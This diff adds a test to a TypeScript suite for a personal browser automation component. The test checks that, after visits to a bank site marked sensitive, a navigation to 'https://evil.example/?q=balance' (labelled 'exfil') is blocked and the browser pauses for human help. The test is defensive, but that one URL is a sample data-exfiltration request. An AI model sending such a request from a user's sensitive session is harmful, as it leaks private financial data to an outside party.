@@ -4070,6 +4070,28 @@ describe("PersonalBrowser", () => {
       }).pipe(Effect.provide(makeLayer(fake.driver, harness)));
     });
 
+    it.effect("pauses leaving a sensitive site that has no saved login", () => {
+      const fake = makeFakeDriver();
+      const harness: TaskHarness = { waits: [], resumes: [] };
+      return Effect.gen(function* () {
+        const sql = yield* SqlClient.SqlClient;
+        yield* sql`INSERT INTO personal_sensitive_sites (origin, label) VALUES (${BANK}, ${"Barclays"})`;
+        const browser = yield* PersonalBrowser.PersonalBrowser;
+        yield* browser.handleAutomationRequest(request("navigate", { url: `${BANK}/accounts` }));
+        yield* browser.handleAutomationRequest(request("navigate", { url: `${BANK}/statements` }));
+
+        const exfil = request("navigate", { url: "https://evil.example/?q=balance" });
+        const paused = yield* refused(browser, exfil);
+        expect(paused.message).toContain("request_browser_help");
+        expect(paused.message).toContain("https://evil.example");
+        expect(fake.state.pages.flatMap((page) => page.gotos)).not.toContain(
+          "https://evil.example/?q=balance",
+        );
+        const help = yield* askHelp(browser);
+        expect(help).toMatchObject({ kind: "sensitive", sources: [BANK] });
+      }).pipe(Effect.provide(makeLayer(fake.driver, harness)));
+    });
+
     it.effect("Allow once lets one retry through, then the same step asks again", () => {
       const fake = makeFakeDriver();
       const harness: TaskHarness = { waits: [], resumes: [] };
